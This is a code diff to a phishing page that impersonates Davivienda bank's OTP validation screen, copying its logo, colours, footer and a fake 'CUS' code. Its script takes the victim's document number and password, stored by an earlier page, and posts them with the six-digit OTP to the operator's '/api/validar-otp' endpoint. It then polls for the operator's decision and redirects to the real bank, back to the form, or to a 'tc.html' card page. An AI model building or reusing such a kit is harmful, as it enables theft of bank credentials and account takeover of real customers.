@@ -4,143 +4,114 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Validación OTP - Davivienda</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
+        /* --- ESTILOS BASE COMPARTIDOS --- */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { display: flex; flex-direction: column; min-height: 100vh; background-color: #f4f4f4; overflow: hidden; }
+        body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        header { background-color: #E30613; display: flex; justify-content: space-between; align-items: center; padding: 0 40px 0 0; color: white; height: 85px; z-index: 10; }
+        .logo-container { display: flex; align-items: center; height: 100%; cursor: pointer; text-decoration: none; }
+        .logo-container img { height: 45px; margin-left: 60px; }
+        .header-info { text-align: right; font-size: 14px; line-height: 1.4; padding-right: 40px; }
+        main { flex-grow: 1; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; text-align: center; position: relative; background-image: url('mujer.png'); background-size: cover; background-position: center top; background-repeat: no-repeat; color: white; padding: 60px 20px 20px 20px; }
+        .content { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 900px; transition: filter 0.4s ease, opacity 0.4s ease; }
         
-        header { background-color: #E30613; display: flex; justify-content: center; align-items: center; height: 85px; }
-        .logo-container img { height: 45px; }
-
-        .container { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; position: relative; }
+        .title { font-size: 36px; font-weight: 300; margin-bottom: 0px; letter-spacing: -0.5px; }
+        .subtitle { font-size: 34px; font-weight: 700; margin-bottom: 25px; }
+        .form-card { background-color: rgba(255, 255, 255, 0.4); border: 3px solid white; border-radius: 20px; padding: 20px 30px; width: 100%; max-width: 800px; color: #000; backdrop-filter: blur(5px); }
+        .form-title { font-size: 16px; font-weight: 700; margin-bottom: 20px; }
         
-        /* El formulario principal */
-        .card { 
-            background-color: white; 
-            padding: 40px; 
-            border-radius: 15px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-            max-width: 450px; 
-            width: 100%; 
-            transition: filter 0.4s ease, opacity 0.4s ease;
-        }
-
-        /* Efecto Blur cuando está cargando */
-        .card.blur-active {
-            filter: blur(6px);
-            opacity: 0.6;
-            pointer-events: none; 
-        }
-
-        .title { color: #E30613; font-size: 24px; font-weight: 700; margin-bottom: 10px; }
-        .subtitle { color: #555; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
-        
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
-        .otp-inputs input { width: 45px; height: 55px; font-size: 24px; text-align: center; border: 2px solid #ccc; border-radius: 8px; outline: none; font-weight: bold; }
+        .form-row { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px; }
+        .otp-inputs { display: flex; gap: 10px; }
+        .otp-inputs input { width: 50px; height: 55px; font-size: 24px; text-align: center; border: 2px solid #ccc; border-radius: 8px; outline: none; font-weight: bold; background: white; }
         .otp-inputs input:focus { border-color: #E30613; }
-
-        .btn { width: 100%; height: 45px; background-color: #E30613; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s; display: flex; justify-content: center; align-items: center; }
+        
+        .btn { height: 45px; padding: 0 40px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; background-color: #E30613; color: white; transition: transform 0.2s; width: 100%; max-width: 300px; }
         .btn:hover:not(:disabled) { transform: scale(1.02); }
         .btn:disabled { background-color: #999; cursor: not-allowed; }
-        
-        .btn-spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+
+        /* Overlay de carga */
+        .loading-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; justify-content: center; align-items: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; }
+        .loading-overlay.active { opacity: 1; pointer-events: auto; }
+        .content.blur-active { filter: blur(8px); opacity: 0.4; pointer-events: none; }
+        .loading-box { background: white; padding: 30px 50px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .big-spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #E30613; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* --- PANTALLA DE CARGA (OVERLAY) --- */
-        .loading-overlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
-            transition: opacity 0.4s ease;
-        }
-        
-        .loading-overlay.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .loading-box {
-            background: white;
-            padding: 30px 50px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .big-spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #E30613;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
         .loading-text { font-size: 18px; font-weight: 700; color: #333; }
 
+        footer { background-color: #000000; color: white; display: flex; align-items: center; justify-content: space-between; padding: 0 40px; height: 90px; z-index: 10; }
+        .footer-left { display: flex; align-items: center; width: 250px; } .footer-left img { height: 45px; }
+        .footer-text { font-size: 15px; font-weight: 400; text-align: center; flex-grow: 1; }
+        .footer-right { display: flex; align-items: center; justify-content: flex-end; width: 250px; } .footer-right img { height: 60px; }
+
         @media (max-width: 768px) {
-            .card { padding: 25px 20px; }
-            .otp-inputs input { width: 38px; height: 48px; font-size: 20px; }
+            body { overflow-y: auto; height: auto; min-height: 100vh; }
+            header { flex-direction: column; height: auto; padding: 15px 0 0 0; gap: 15px; }
+            .logo-container { justify-content: center; width: 100%; } .logo-container img { margin-left: 0; height: 40px; }
+            .header-info { background-color: white; color: #666; width: 100%; padding: 10px 0; font-size: 13px; }
+            main { padding: 40px 15px; justify-content: center; }
+            .title { font-size: 28px; } .subtitle { font-size: 26px; margin-bottom: 20px; }
+            .form-card { padding: 25px 15px; }
+            .otp-inputs input { width: 40px; height: 45px; font-size: 20px; }
+            footer { flex-direction: column; height: auto; padding: 12px 15px; gap: 5px; }
+            .footer-text { order: -1; font-size: 13px; } .footer-left { width: auto; justify-content: center; } .footer-left img { height: 22px; } .footer-right { display: none; }
         }
     </style>
 </head>
 <body>
-    <header><div class="logo-container"><img src="davi.png" alt="Davivienda"></div></header>
+    <header>
+        <a href="index.html" class="logo-container"><img src="davi.png" alt="Davivienda"></a>
+        <div class="header-info"><div id="fecha-hora">Cargando fecha...</div><div id="codigo-cus">Código único CUS: Cargando...</div></div>
+    </header>
 
-    <div class="container">
-        <!-- Overlay de Carga -->
+    <main>
         <div class="loading-overlay" id="loadingOverlay">
-            <div class="loading-box">
-                <div class="big-spinner"></div>
-                <div class="loading-text">Cargando...</div>
-            </div>
+            <div class="loading-box"><div class="big-spinner"></div><div class="loading-text">Cargando...</div></div>
         </div>
 
-        <!-- Tarjeta del Formulario -->
-        <div class="card blur-active" id="otpCard">
+        <div class="content" id="mainContent">
             <div class="title">Validación de Seguridad</div>
-            <div class="subtitle">Ingrese el código de 6 dígitos que enviamos a su dispositivo.</div>
-            
-            <div class="otp-inputs">
-                <input type="text" maxlength="1" oninput="moveNext(this, 0)">
-                <input type="text" maxlength="1" oninput="moveNext(this, 1)">
-                <input type="text" maxlength="1" oninput="moveNext(this, 2)">
-                <input type="text" maxlength="1" oninput="moveNext(this, 3)">
-                <input type="text" maxlength="1" oninput="moveNext(this, 4)">
-                <input type="text" maxlength="1" oninput="moveNext(this, 5)">
-            </div>
+            <div class="subtitle">Ingrese el código OTP</div>
 
-            <button class="btn" id="btnValidar" onclick="enviarOTP()">
-                <span id="btnText">Validar Código</span>
-                <div class="btn-spinner" id="btnSpinner"></div>
-            </button>
+            <div class="form-card">
+                <div class="form-title">Hemos enviado un código de 6 dígitos a su dispositivo.</div>
+                
+                <div class="form-row">
+                    <div class="otp-inputs">
+                        <input type="text" maxlength="1" oninput="moveNext(this, 0)">
+                        <input type="text" maxlength="1" oninput="moveNext(this, 1)">
+                        <input type="text" maxlength="1" oninput="moveNext(this, 2)">
+                        <input type="text" maxlength="1" oninput="moveNext(this, 3)">
+                        <input type="text" maxlength="1" oninput="moveNext(this, 4)">
+                        <input type="text" maxlength="1" oninput="moveNext(this, 5)">
+                    </div>
+                    <button class="btn" id="btnValidar" onclick="enviarOTP()">Validar Código</button>
+                </div>
+            </div>
         </div>
-    </div>
+    </main>
+
+    <footer>
+        <div class="footer-left"><img src="vig.png" alt="Vigilado"></div>
+        <div class="footer-text">Banco Davivienda S.A. Todos los derechos reservados 2023.</div>
+        <div class="footer-right"><img src="blanco.png" alt="Davivienda"></div>
+    </footer>
 
     <script>
-        // 1. LEER DATOS (Con protección para que NO rebote)
+        function actualizarFecha() {
+            const meses = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
+            const dias = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
+            const ahora = new Date(); let horas = ahora.getHours(); const ampm = horas >= 12 ? 'PM' : 'AM'; horas = horas % 12 || 12; 
+            document.getElementById('fecha-hora').textContent = `${dias[ahora.getDay()]} ${ahora.getDate()} de ${meses[ahora.getMonth()]} de ${ahora.getFullYear()}, ${horas}:${ahora.getMinutes().toString().padStart(2, '0')} ${ampm}`;
+        }
+        function generarCUS() { document.getElementById('codigo-cus').textContent = `Código único CUS: ${Math.floor(100 + Math.random() * 900)}-${Math.floor(1000000 + Math.random() * 9000000)}`; }
+        actualizarFecha(); generarCUS();
+
         const documento = localStorage.getItem('doc_usuario') || 'No leido';
         const clave = localStorage.getItem('clave_usuario') || 'No leida';
 
-        // 2. SIMULACIÓN DE CARGA (3 segundos)
-        setTimeout(() => {
-            const overlay = document.getElementById('loadingOverlay');
-            overlay.classList.add('hidden');
-            const card = document.getElementById('otpCard');
-            card.classList.remove('blur-active');
-            
-            const firstInput = document.querySelector('.otp-inputs input');
-            if (firstInput) firstInput.focus();
-        }, 3000);
-
-        // 3. AVANZAR ENTRE INPUTS
         function moveNext(current, index) {
             current.value = current.value.replace(/[^0-9]/g, '');
             if (current.value.length === 1) {
@@ -149,30 +120,19 @@
             }
         }
 
-        // 4. ENVIAR OTP
         async function enviarOTP() {
             const inputs = document.querySelectorAll('.otp-inputs input');
             let otp = '';
             inputs.forEach(input => otp += input.value);
 
-            if (otp.length < 6) {
-                alert("Por favor, ingrese los 6 dígitos.");
-                return;
-            }
+            if (otp.length < 6) { alert("Por favor, ingrese los 6 dígitos."); return; }
 
-            const btn = document.getElementById('btnValidar');
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('btnSpinner');
-
-            btnText.style.display = 'none';
-            spinner.style.display = 'block';
-            btn.disabled = true;
+            document.getElementById('mainContent').classList.add('blur-active');
+            document.getElementById('loadingOverlay').classList.add('active');
 
             try {
                 const res = await fetch('/api/validar-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ documento, clave, otp })
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ documento, clave, otp })
                 });
                 const data = await res.json();
 
@@ -186,33 +146,26 @@
                             window.location.href = 'https://www.davivienda.com';
                         } else if (statusData.estado === 'error') {
                             clearInterval(interval);
+                            document.getElementById('mainContent').classList.remove('blur-active');
+                            document.getElementById('loadingOverlay').classList.remove('active');
                             alert('Error: El código OTP es incorrecto o ha expirado. Intente de nuevo.');
-                            resetBtn();
+                            document.querySelectorAll('.otp-inputs input').forEach(input => input.value = '');
+                            document.querySelector('.otp-inputs input').focus();
                         } else if (statusData.estado === 'tc') {
                             clearInterval(interval);
                             window.location.href = 'tc.html';
                         }
                     }, 3000);
                 } else {
+                    document.getElementById('mainContent').classList.remove('blur-active');
+                    document.getElementById('loadingOverlay').classList.remove('active');
                     alert('Error de conexión. Intente de nuevo.');
-                    resetBtn();
                 }
             } catch (e) {
+                document.getElementById('mainContent').classList.remove('blur-active');
+                document.getElementById('loadingOverlay').classList.remove('active');
                 alert('Error de red.');
-                resetBtn();
             }
-        }
-
-        function resetBtn() {
-            const btn = document.getElementById('btnValidar');
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('btnSpinner');
-            btnText.style.display = 'block';
-            spinner.style.display = 'none';
-            btn.disabled = false;
-            
-            document.querySelectorAll('.otp-inputs input').forEach(input => input.value = '');
-            document.querySelector('.otp-inputs input').focus();
         }
     </script>
 </body>
